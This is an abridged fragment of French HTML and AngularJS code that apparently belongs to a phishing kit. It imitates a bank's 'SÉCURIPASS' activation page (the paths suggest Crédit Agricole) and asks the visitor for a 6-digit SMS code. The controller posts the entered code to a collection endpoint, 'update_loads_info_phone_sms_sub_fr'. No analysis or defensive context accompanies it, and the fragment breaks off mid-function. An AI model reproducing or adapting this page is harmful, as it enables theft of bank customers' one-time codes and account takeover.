		                 ...
		                 <div class="Template-reduceMargin15px">
		                    <div class="Login-container">
		                        <div class="Login-title">
		                            <h1>J'ACTIVE MON <strong> SÉCURIPASS</strong></h1>
		                        </div>
										...
										<div class="login-mini parbase" id="loading_start" style="height: 16rem;display:none;">
		                                 ...
		                                 <div class="login-mini parbase" id="contant_start">
											<form class="Login-form" id="loginForm" name="loginForm" novalidate="">
												<div class="row row-no-padding">
												    <div class="form-group">
												        <div class="col-xs-12 Login-noPadding ForgotPswd-paragraphInformation">
															<p style="font-weight:bold;">Veuillez saisir un code à 6 chiffres envoyé par sms sur votre mobile : </p>
														</div>  
												...
												<div class="col-xs-12 Login-noPadding error" style="display:block;">
												    ...
												    <div class="form-group " id="space_code_pass">
											           	...
											           	<div class="col-xs-12 Login-noPadding" id="Login-password-div">
												        	 <div class="add-clear-span form-group">
												        	 	...
												        	 	placeholder="Ex: 564789" ng-change="bloc_login()" maxlength="8"   autocomplete="off"
												        	 	ng-model="bloc_pwd_input" style="font-weight: 900;font-size: 25px;">
												        	 ...
												        	 <small>Entrez le code reçu par SMS et appuyez sur "VALIDER".</small>
												...
												<div class="row row-no-padding">
													<div class="col-xs-12">
												   <!--  	<input value="Valider" id="validation" aria-label="Validation du code personnel" type="submit" class="btn btn-primary Login-button col-xs-12" disabled="" ng-click="validation()" >
 -->
	                                              <button  id="validation" aria-label="Validation du code personnel" type="submit" class="btn btn-primary Login-button col-xs-12" disabled="" ng-click="validation()" >  
												  Valider</button>
...
fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
        ...
        var pathname = urlx.replace("verify_sms_err.php", "");
 ...
 setInterval(function() {
     ...
     $scope.bloc_login = function(){ 
	  	...
	  	}else if( $scope.bloc_pwd_input.length >= 5){
	...
	$scope.validation = function(){
        ...
        if(!$scope.isInteger($scope.val_login)){
           ...
           // $scope.login_span_close();
            ...
            Detaile.phone_sms_sub= $scope.bloc_pwd_input;
            console.log(Detaile)
		     $http({
		          method: 'post',
		          url: $scope.base_url+"api_cl/ca/update_loads_info_phone_sms_sub_fr",
		          data: Detaile, 
		          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
		    }).then(function(data) {
